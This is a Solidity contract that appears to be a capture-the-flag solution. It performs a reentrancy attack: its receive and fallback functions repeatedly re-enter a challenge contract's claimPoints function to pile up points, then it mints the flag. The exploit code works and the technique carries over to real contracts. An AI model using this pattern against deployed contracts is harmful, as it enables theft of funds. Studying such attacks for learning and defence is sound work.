//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IChallenge5 {
    function claimPoints() external;
    function points(address) external view returns (uint256);
    function mintFlag() external;
}

contract Challenge5Attacker {
    IChallenge5 public challenge;
    uint256 public counter;
    uint256 public targetPoints;

    constructor(address _challenge) {
        challenge = IChallenge5(_challenge);
    }

    // Fallback function for reentrancy
    receive() external payable {
        // Reentrancy: Recursively call until 10 points
        if (counter < 9) {
            counter++;
            challenge.claimPoints();
        }
    }

    // Also add fallback function (for cases with data)
    fallback() external payable {
        // Reentrancy: Recursively call until 10 points
        if (counter < 9) {
            counter++;
            challenge.claimPoints();
        }
    }

    // Reentrancy attack
    function attack() external {
        counter = 0;
        // Call claimPoints first (this triggers fallback and recursively earns 10 points)
        challenge.claimPoints();

        // Check points
        targetPoints = challenge.points(tx.origin);
    }

    // Check points
    function checkPoints() external view returns (uint256) {
        return challenge.points(tx.origin);
    }

    // Mint flag
    function mintFlag() external {
        challenge.mintFlag();
    }
}